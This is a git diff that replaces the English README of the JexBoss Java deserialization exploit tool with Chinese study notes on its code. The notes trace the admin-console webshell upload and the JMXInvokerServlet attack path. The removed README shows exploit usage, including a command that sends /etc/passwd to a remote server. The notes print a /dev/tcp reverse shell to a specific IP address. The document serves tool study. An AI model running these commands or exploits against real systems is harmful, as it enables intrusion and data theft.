@@ -1,280 +1,66 @@
-JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool
-==============================================================================================
+接受-u参数中的url，然后交给check_vul函数处理
 
-JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server and others Java Platforms, Frameworks, Applications, etc.
+然后进入 elif vector == "JMXInvokerServlet": 逻辑
 
-Requirements
-----
-* Python >= 2.7.x
-* [urllib3](https://pypi.python.org/pypi/urllib3)
-* [ipaddress](https://pypi.python.org/pypi/ipaddress)
+只要符合条件 if r.getheader('Content-Type') is not None and 'x-java-serialized-object' in r.getheader('Content-Type'):
 
-Installation on Linux\Mac
--------------------------
-To install the latest version of JexBoss, please use the following commands:
+就会返回200，即漏洞存在
 
-	git clone https://github.com/joaomatosf/jexboss.git
-	cd jexboss
-	pip install -r requires.txt
-	python jexboss.py -h
-	python jexboss.py -host http://target_host:8080
+然后将200存储进paths，退出check函数，回到main函数，遍历check函数返回值
 
-	OR:
+这个时候会判断是否配置了自动利用，因为没有配置过，所以直接跳过
 
-	Download the latest version at: https://github.com/joaomatosf/jexboss/archive/master.zip
-	unzip master.zip
-	cd jexboss-master
-	pip install -r requires.txt
-	python jexboss.py -h
-	python jexboss.py -host http://target_host:8080
+然后进入判断逻辑，有两种可能，一种是app deser，一种是else，因为我们的目标是jmxinvokerservlet，所以进入else
+
+接下来会提示进入反弹shell/执行简单cmd，接受用户输入以后，
+
+进入autoexploit函数，这里就可以看出来，前面的自动利用判断相当于强制执行，而这里是给了用户选择的权利
+
+跟进auto函数后发现app de和servlet de似乎是同一种利用方式，而其余的是另一种
 
 
-If you are using CentOS with Python 2.6, please install Python2.7.
-Installation example of the Python 2.7 on CentOS using Collections Software scl:
 
-    yum -y install centos-release-scl
-    yum -y install python27
-    scl enable python27 bash
-
-Installation on Windows
------------------------
-If you are using Windows, you can use the [Git Bash](https://github.com/git-for-windows/git/releases/tag/v2.10.1.windows.1) to run the JexBoss. Follow the steps below:
-
-* Download and install [Python](https://www.python.org/downloads/release/python-2712/)
-* Download and install [Git for Windows](https://github.com/git-for-windows/git/releases/tag/v2.10.1.windows.1)
-* After installing, run the Git for Windows and type the following commands:
-
-```
-    PATH=$PATH:C:\Python27\
-    PATH=$PATH:C:\Python27\Scripts
-    git clone https://github.com/joaomatosf/jexboss.git
-    cd jexboss
-    pip install -r requires.txt
-    python jexboss.py -h
-    python jexboss.py -host http://target_host:8080
-    
-```
-
-Features
-----
-The tool and exploits were developed and tested for:
-
-* JBoss Application Server versions: 3, 4, 5 and 6.
-* Java Deserialization Vulnerabilities in multiple java frameworks, platforms and applications (e.g., Java Server Faces - JSF, Seam Framework, RMI over HTTP, Jenkins CLI RCE (CVE-2015-5317), Remote JMX (CVE-2016-3427, CVE-2016-8735), etc)
-
-The exploitation vectors are:
-
-* /admin-console
-	- tested and working in JBoss versions 5 and 6
-* /jmx-console
-	- tested and working in JBoss versions 4, 5 and 6
-* /web-console/Invoker
-	- tested and working in JBoss versions 4, 5 and 6
-* /invoker/JMXInvokerServlet
-	- tested and working in JBoss versions 4, 5 and 6
-* Application Deserialization
-    - tested and working against multiple java applications, platforms, etc, via HTTP POST Parameters
-* Servlet Deserialization
-    - tested and working against multiple java applications, platforms, etc, via servlets that process serialized objets (e.g. when you see an "Invoker" in a link)
-* Apache Struts2 CVE-2017-5638
-    - tested in Apache Struts 2 applications
-* Others
-
-Videos
-------
-
-* Exploiting Java Deserialization Vulnerabilities (RCE) on JSF/Seam Applications via javax.faces.ViewState with JexBoss
-
-[![Alt text](https://img.youtube.com/vi/VaLSYzEWgVE/0.jpg)](https://www.youtube.com/watch?v=VaLSYzEWgVE)
-
-* Exploiting JBoss Application Server with JexBoss
-
-[![Alt text](https://img.youtube.com/vi/yI54sRqFOyI/0.jpg)](https://www.youtube.com/watch?v=yI54sRqFOyI)
-
-* Exploiting Apache Struts2 (RCE) with Jexboss (CVE-2017-5638)
-
-[![Alt text](https://img.youtube.com/vi/PSRsVcfmRSg/0.jpg)](https://www.youtube.com/watch?v=PSRsVcfmRSg)
-
-Screenshots
-----
-
-* Simple usage examples:
-```
-$ python jexboss.py
-```
-![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/simple_usage_help.png)
-
-* Example of standalone mode against JBoss:
-```
-$ python jexboss.py -u http://192.168.0.26:8080
-```
-![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/standalone_mode1.png)
-![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/standalone_mode2.png)
-
-* Usage modes:
-```
-$ python jexboss.py -h
-```
-
-* Network scan mode:
-```
-$ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080 -results results.txt
-```
-![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/network_scan_mode.png)
-
-* Network scan with auto-exploit mode:
-```
-$ python jexboss.py -mode auto-scan -A -network 192.168.0.0/24 -ports 8080 -results results.txt
-```
-![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/scan_with_auto_exploit_mode.png)
-
-* Results and recommendations:
-
-![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/results_and_recommendations2.png)
+admin-console漏洞判断及利用逻辑
 
 
-Reverse Shell (meterpreter integration)
----------------------------------------
-After you exploit a JBoss server, you can use the own jexboss command shell or perform a reverse connection using the following command:
-```
-   jexremote=YOUR_IP:YOUR_PORT
+下面会有漏洞利用类型的判断逻辑，进入admin-console，会访问/admin-console/login.seam页面
 
-   Example:
-     Shell>jexremote=192.168.0.10:4444
-```
+判断页面正常就会获取cookie和token，具体细节不表
 
-* Example:
-![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/jexbossreverse2.jpg)
+然后将新获取的cookie和token分别放进头和body中，再将账号密码放进body中，请求页面，
 
-When exploiting java deserialization vulnerabilities (Application Deserialization, Servlet Deserialization), the default options are: make a reverse shell connection or send a commando to execute.
+如果302跳转了，说明登陆成功，如果返回状态值200，说明失败，sleep几秒以后，返回登陆失败提示
+
+如果成功，这里会进行两个请求，然后上传一个二进制文件，这是一个小马
 
 
-Usage examples
---------------
 
-* For Java Deserialization Vulnerabilities in a custom HTTP parameter and to send a custom command to be executed on the exploited server:
-```
-$ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize -H parameter_name --cmd 'curl -d@/etc/passwd http://your_server'
-```
+和上面admin一样，先判断是不是autoexploit，然后判断app der，因为这里是jmxinvoker，所以进入else
 
-* For Java Deserialization Vulnerabilities in a custom HTTP parameter and to make a reverse shell (this will ask for an IP address and port of your remote host):
-```
-$ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize -H parameter_name
-```
+然后提示即将返回一个简单cmd，问你是否继续，输入yes，进入autoexploit。
 
-* For Java Deserialization Vulnerabilities in a Servlet (like Invoker):
-```
-$ python jexboss.py -u http://vulnerable_java_app/path --servlet-unserialize
-```
+然后进入invoker逻辑，对url进行处理只保留【协议://域名:端口】，
 
-* For Apache Struts 2 (CVE-2017-5638)
-```
-$ python jexboss.py -u http://vulnerable_java_struts2_app/page.action --struts2
-```
+然后交给_exploits.exploit_jmx_invoker_file_repository处理，发现payload的数据类型是列表，猜测是16进制的
 
-* For Apache Struts 2 (CVE-2017-5638) with cookies for authenticated resources
-```
-$ python jexboss.py -u http://vulnerable_java_struts2_app/page.action --struts2 --cookies "JSESSIONID=24517D9075136F202DCE20E9C89D424D"
-```
+其实poc不难，就两种版本，只有四个字符的不同
 
-* Auto scan mode:
-```
-$ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080,80 -results report_auto_scan.log
-```
+他会通过post请求/invoker/JMXInvokerServlet然后将jsp写进去，
 
-* File scan mode:
-```
-$ python jexboss.py -mode file-scan -file host_list.txt -out report_file_scan.log
-```
+但是很尴尬，这个payload似乎不起效果，/jexinv4/jexinv4.jsp无法访问，404
 
-* More Options:
+别担心作者还有后手，让_exploits.exploit_jmx_invoker_file_repository去继续利用，只是这次换成了version=1，也就是上面说的另一个版本
 
-```
-optional arguments:
-  -h, --help            show this help message and exit
-  --version             show program's version number and exit
-  --auto-exploit, -A    Send exploit code automatically (USE ONLY IF YOU HAVE
-                        PERMISSION!!!)
-  --disable-check-updates, -D
-                        Disable two updates checks: 1) Check for updates
-                        performed by the webshell in exploited server at
-                        http://webshell.jexboss.net/jsp_version.txt and 2)
-                        check for updates performed by the jexboss client at
-                        http://joaomatosf.com/rnp/releases.txt
-  -mode {standalone,auto-scan,file-scan}
-                        Operation mode (DEFAULT: standalone)
-  --app-unserialize, -j
-                        Check for java unserialization vulnerabilities in HTTP
-                        parameters (eg. javax.faces.ViewState, oldFormData,
-                        etc)
-  --servlet-unserialize, -l
-                        Check for java unserialization vulnerabilities in
-                        Servlets (like Invoker interfaces)
-  --jboss               Check only for JBOSS vectors.
-  --jenkins             Check only for Jenkins CLI vector.
-  --jmxtomcat           Check JMX JmxRemoteLifecycleListener in Tomcat
-                        (CVE-2016-8735 and CVE-2016-8735). OBS: Will not be
-                        checked by default.
-  --proxy PROXY, -P PROXY
-                        Use a http proxy to connect to the target URL (eg. -P
-                        http://192.168.0.1:3128)
-  --proxy-cred LOGIN:PASS, -L LOGIN:PASS
-                        Proxy authentication credentials (eg -L name:password)
-  --jboss-login LOGIN:PASS, -J LOGIN:PASS
-                        JBoss login and password for exploit admin-console in
-                        JBoss 5 and JBoss 6 (default: admin:admin)
-  --timeout TIMEOUT     Seconds to wait before timeout connection (default 3)
+结果还是不行，404
 
-Standalone mode:
-  -host HOST, -u HOST   Host address to be checked (eg. -u
-                        http://192.168.0.10:8080)
+依然没关系，作者还有办法，可以生成cmd反弹shell，'/bin/bash -c /bin/bash${IFS}-i>&/dev/tcp/39.105.165.219/9999<&1'
 
-Advanced Options (USE WHEN EXPLOITING JAVA UNSERIALIZE IN APP LAYER):
-  --reverse-host RHOST:RPORT, -r RHOST:RPORT
-                        Remote host address and port for reverse shell when
-                        exploiting Java Deserialization Vulnerabilities in
-                        application layer (for now, working only against *nix
-                        systems)(eg. 192.168.0.10:1331)
-  --cmd CMD, -x CMD     Send specific command to run on target (eg. curl -d
-                        @/etc/passwd http://your_server)
-  --windows, -w         Specifies that the commands are for rWINDOWS System$
-                        (cmd.exe)
-  --post-parameter PARAMETER, -H PARAMETER
-                        Specify the parameter to find and inject serialized
-                        objects into it. (egs. -H javax.faces.ViewState or -H
-                        oldFormData (<- Hi PayPal =X) or others) (DEFAULT:
-                        javax.faces.ViewState)
-  --show-payload, -t    Print the generated payload.
-  --gadget {commons-collections3.1,commons-collections4.0,groovy1}
-                        Specify the type of Gadget to generate the payload
-                        automatically. (DEFAULT: commons-collections3.1 or
-                        groovy1 for JenKins)
-  --load-gadget FILENAME
-                        Provide your own gadget from file (a java serialized
-                        object in RAW mode)
-  --force, -F           Force send java serialized gadgets to URL informed in
-                        -u parameter. This will send the payload in multiple
-                        formats (eg. RAW, GZIPED and BASE64) and with
-                        different Content-Types.
+这种写法的优点是没有空格，不会触发runtime的错误，然后把这个shell放到commonscollections3里面处理一下，
 
-Auto scan mode:
-  -network NETWORK      Network to be checked in CIDR format (eg. 10.0.0.0/8)
-  -ports PORTS          List of ports separated by commas to be checked for
-                        each host (eg. 8080,8443,8888,80,443)
-  -results FILENAME     File name to store the auto scan results
+然后请求invoker页面，这次能返回200，我有点怀疑是不是之前的jsp那个payload有问题呀，
 
-File scan mode:
-  -file FILENAME_HOSTS  Filename with host list to be scanned (one host per
-                        line)
-  -out FILENAME_RESULTS
-                        File name to store the file scan results
-
-```
+至此，admin和jmxinvoker就走完了，整个工具的代码就感觉逻辑有点复杂，显然非一日之功，安全之路道阻且长啊。
 
 
-Questions, problems, suggestions and etc:
-----
-
-* joaomatosf@gmail.com
-
+S2-046 CVE-2017-5638
 
